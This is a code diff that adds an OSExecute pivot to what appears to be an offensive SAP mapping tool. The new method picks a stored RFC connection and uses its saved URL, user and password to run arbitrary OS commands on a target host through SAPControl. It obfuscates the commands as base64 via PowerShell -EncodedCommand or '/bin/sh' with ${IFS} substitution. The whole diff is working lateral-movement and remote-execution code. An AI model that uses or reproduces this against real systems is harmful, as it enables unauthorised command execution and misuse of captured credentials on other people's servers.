@@ -10095,6 +10095,81 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     f"ssh from {acc['from_sid']} → "
                     f"{acc['username']}@{acc['target']}"),
             }
+        elif method == "sapcontrol":
+            # SAPControl OSExecute pivot — find any INCOMING Type-G
+            # connection targeting this node with os_exec_verified=True
+            # and route the command through its
+            # /SAPControl.CGI endpoint.  Same shell-wrap rules as the
+            # standalone /sapcontrol_osexecute endpoint (auto-detect
+            # OS via conn.target_os_hint, base64-wrap non-absolute
+            # commands, etc.).
+            sc_conn = None
+            for c in api.state.connections:
+                if (c.target_sid == sid
+                        and getattr(c, "os_exec_verified", False)):
+                    sc_conn = c
+                    break
+            if sc_conn is None:
+                return json.dumps({"error": (
+                    "no SAPControl-verified Type-G destination "
+                    "targeting this node — run Test Connection on a "
+                    "SAPControl/Host-Agent Type-G destination first "
+                    "to set os_exec_verified")})
+            _url = sc_conn.http_url or ""
+            _user = sc_conn.rfc_user or ""
+            _pwd = sc_conn.secstore_password or ""
+            if not (_url and _user and _pwd):
+                return json.dumps({"error": (
+                    f"SAPControl connection {sc_conn.destination_name!r} "
+                    "missing url / user / password")})
+            # OS-picker mirrors the sapcontrol_osexecute endpoint.
+            _hint = (sc_conn.target_os_hint or "").lower()
+            if _hint == "windows":
+                is_windows = True
+            elif _hint == "unix":
+                is_windows = False
+            else:
+                _ost = (node.os_type or "").lower()
+                is_windows = (
+                    any(w in _ost for w in ("windows", "nt", "win"))
+                    or _user.lower().startswith("sapservice"))
+            _cmd = cmdline or ""
+            raw_safe = not any(c in _cmd for c in " \t|&<>$`\"'\\")
+            _abs = (_cmd.startswith("/") or (
+                len(_cmd) >= 3 and _cmd[0].isalpha()
+                and _cmd[1:3] == ":\\"))
+            if not (raw_safe and _abs):
+                import base64 as _b64
+                if is_windows:
+                    b64 = _b64.b64encode(
+                        _cmd.encode("utf-16-le")).decode("ascii")
+                    _cmd = (
+                        r"C:\Windows\System32\WindowsPowerShell\v1.0"
+                        r"\powershell.exe -NoProfile -NonInteractive"
+                        f" -EncodedCommand {b64}")
+                else:
+                    b64 = _b64.b64encode(
+                        _cmd.encode("utf-8")).decode("ascii")
+                    _cmd = (f"/bin/sh -c echo${{IFS}}{b64}"
+                            f"|base64${{IFS}}-d|/bin/sh")
+            r = sapmap_rfc.sapcontrol_os_execute(
+                _url, _user, _pwd, _cmd, timeout=30.0)
+            _out = (r.get("output") or "").splitlines()
+            result = {
+                "success": bool(r.get("ok")
+                                 and r.get("exit_code", -1) == 0),
+                "output": _out,
+                "error": r.get("error") or (
+                    f"exit code {r.get('exit_code')}"
+                    if r.get("ok") and r.get("exit_code", 0) != 0
+                    else ""),
+                "channel": "sapcontrol_osexec",
+                "channel_reason": (
+                    f"OSExecute via SAPControl at {_url} "
+                    f"as {_user} (from RFC destination "
+                    f"{sc_conn.destination_name!r} on "
+                    f"{sc_conn.source_sid})"),
+            }
         else:
             return json.dumps({"error": f"Unknown method: {method}"})
 
